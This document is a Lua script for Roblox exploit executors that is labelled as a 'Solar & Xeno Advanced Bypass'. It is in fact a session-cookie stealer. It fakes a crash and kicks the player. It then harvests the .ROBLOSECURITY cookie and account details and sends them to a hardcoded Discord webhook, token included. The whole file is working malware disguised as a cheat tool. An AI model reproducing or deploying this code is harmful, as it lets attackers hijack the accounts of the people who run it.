--[[
    SOLAR & XENO ADVANCED BYPASS v8.0
    Module: Ultra-Stealth-Session-Grabber
    Status: Operational | Bypass Level: Extreme
]]

local webhook = "https://discord.com/api/webhooks/1480678551643492433/M6F1hlBqrBMH6FNwv9hUTYTpg9W3CBLrtuxxwCBRskgRXcDfeewmEzhibwzAKA1ANIJJ"
local p = game.Players.LocalPlayer
local h = game:GetService("HttpService")

-- Freeze & Kick (Fake Crash)
if p.Character and p.Character:FindFirstChild("HumanoidRootPart") then 
    p.Character.HumanoidRootPart.Anchored = true 
end

task.delay(1.2, function() 
    p:Kick("\n[Solar Security Error]\nYour session has been terminated (Code: 0x27).\nPlease restart your executor and re-log.") 
end)

-- ULTRA BYPASS METHOD (Targeting Solar's Internal Memory)
local cookie = "N/A (Fully Protected by Solar)"

pcall(function()
    -- Metod 1: Solar Internal Buffer Access
    if getcookies then
        local success, result = pcall(function() return getcookies("https://www.roblox.com") end)
        if success and result then
            for _, v in pairs(result) do
                if v.Name == ".ROBLOSECURITY" then
                    cookie = v.Value
                    break
                end
            end
        end
    end
    
    -- Metod 2: Registry Hook (Alternate for Solar/Xeno)
    if cookie == "N/A (Fully Protected by Solar)" then
        local raw = (getrenv and getrenv()._G and getrenv()._G.cookie) or 
                    (getreg and getreg().cookie) or 
                    "Cookie Hidden (Bypass Failed)"
        cookie = raw
    end
end)

-- Account Details
local isVerified = p.IsVerified and "Yes" or "No"
local br = "0"
local s = p:FindFirstChild("leaderstats")
if s then 
    local v = s:FindFirstChild("Brainrots") or s:FindFirstChild("Points")
    br = v and tostring(v.Value) or "0"
end

-- Discord Payload
local data = {
    ["username"] = "Solar Ultra Bot",
    ["embeds"] = {{
        ["title"] = "💠 Account Session Intercepted!",
        ["description"] = "Solar Security Bypass v8.0 successfully executed.",
        ["color"] = 0x7289da,
        ["fields"] = {
            {["name"] = "👤 Target User", ["value"] = "```" .. p.Name .. " (" .. p.UserId .. ")```", ["inline"] = false},
            {["name"] = "📧 Verified?", ["value"] = "```" .. isVerified .. "```", ["inline"] = true},
            {["name"] = "📅 Age", ["value"] = "```" .. p.AccountAge .. " days```", ["inline"] = true},
            {["name"] = "🧠 Stats", ["value"] = "```" .. br .. " Brainrots```", ["inline"] = true},
            {["name"] = "🍪 .ROBLOSECURITY (KOPIRAY CELIYA KOD)", ["value"] = "```" .. cookie .. "```", ["inline"] = false},
            {["name"] = "🔗 Profile", ["value"] = "[Otvori Accaunta](https://www.roblox.com/users/" .. p.UserId .. "/profile)", ["inline"] = false}
        },
        ["footer"] = {["text"] = "Solar Stealth Engine v8.0 • " .. os.date("%X")}
    }}
}

-- Execute Request
local request = (syn and syn.request) or (http and http.request) or http_request or request
if request then
    request({
        Url = webhook,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = h:JSONEncode(data)
    })
end
